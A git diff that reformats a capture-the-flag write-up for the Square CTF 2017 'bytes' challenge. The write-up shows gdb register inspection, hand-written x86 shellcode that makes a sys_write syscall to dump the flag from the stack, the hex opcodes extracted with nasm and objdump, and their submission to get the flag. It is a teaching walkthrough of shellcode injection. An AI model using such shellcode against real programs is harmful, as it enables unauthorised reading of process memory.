@@ -6,15 +6,20 @@
 > https://*redacted*.capturethesquare.com 
 
 1. To get started, download the file
-2. Run it: ```
+2. Run it: 
+```
 daMage@kalima:~/ctfs/squarectf2017/bytes$ ./bytes  f000
 Shellcode location: 0xf770d000
 Flag location: 0xffad5e50
-WUNTEE_CHALLENGE_FLAG environmental variable not set. Could not read flag.```
-3. Prepare the environment:```
+WUNTEE_CHALLENGE_FLAG environmental variable not set. Could not read flag.
+```
+3. Prepare the environment:
+```
 daMage@kalima:~/ctfs/squarectf2017/bytes$ echo abcdefghijklmnopqrstu > flag.txt
-daMage@kalima:~/ctfs/squarectf2017/bytes$ export WUNTEE_CHALLENGE_FLAG=flag.txt```
-4. Run the executable with gdb, and pass the cc's (interrupt / Int3) as the shellcode. Now is a good time to check the registers: ```
+daMage@kalima:~/ctfs/squarectf2017/bytes$ export WUNTEE_CHALLENGE_FLAG=flag.txt
+```
+4. Run the executable with gdb, and pass the cc's (interrupt / Int3) as the shellcode. Now is a good time to check the registers: 
+```
 daMage@kalima:~/ctfs/squarectf2017/bytes$ gdb -q ./bytes
 Reading symbols from ./bytes...(no debugging symbols found)...done.
 (gdb) r cccccc
@@ -44,7 +49,8 @@ gs             0x63	99
 (gdb) 
 ```
 5. Notice that the flag address is pretty close to stack pointer (just 0x10 offset).
-6. Prepare simple shellcode: ```
+6. Prepare simple shellcode: 
+```
 daMage@kalima:~/ctfs/squarectf2017/bytes$ cat test.asm 
 mov edx,0x24 ; length to print, just guess now
 mov ecx,esp  ; count the location from stack pointer
@@ -53,8 +59,10 @@ mov ebx,1    ; file descriptor for stdout
 mov eax,4    ; sys_write call number (for 32-bit)
 int 0x80     ; Do linux syscall
 mov eax,1    ; exit gracefully
-int 0x80     ; fin```
-7. Compile with nasm and get the opcodes with objdump: ```
+int 0x80     ; fin
+```
+7. Compile with nasm and get the opcodes with objdump: 
+```
 daMage@kalima:~/ctfs/squarectf2017/bytes$ nasm  -f elf test.asm
 daMage@kalima:~/ctfs/squarectf2017/bytes$ objdump -d -M intel test.o |cut -f2
 
@@ -71,16 +79,18 @@ cd 80
 b8 01 00 00 00       
 cd 80           
 ```
-8. Clean up the output from objdump and try it locally:```
+8. Clean up the output from objdump and try it locally:
+```
 daMage@kalima:~/ctfs/squarectf2017/bytes$ objdump -d -M intel test.o |cut -f2|tail -n 8 |tr -d ' \n'; echo
 ba2400000089e183c110bb01000000b804000000cd80b801000000cd80
 daMage@kalima:~/ctfs/squarectf2017/bytes$ ./bytes ba2400000089e183c110bb01000000b804000000cd80b801000000cd80
 Shellcode location: 0xf77c1000
 Flag location: 0xfff684e0
 abcdefghijklmnopqrstu
-1}��~����daMage@kalima:~/ctfs/squarectf2017/bytes$
+daMage@kalima:~/ctfs/squarectf2017/bytes$
 ```
-9. Finally pass the hex-encoded string to the online form and get flag:```
+9. Finally pass the hex-encoded string to the online form and get flag:
+```
 Output:
 
 Shellcode location: 0xf7765000
@@ -90,4 +100,5 @@ flag-nolyl-kuhyc-leduv-ryvad-mekyk
 
 Status:
 
-pid 82 exit 1```
+pid 82 exit 1
+```
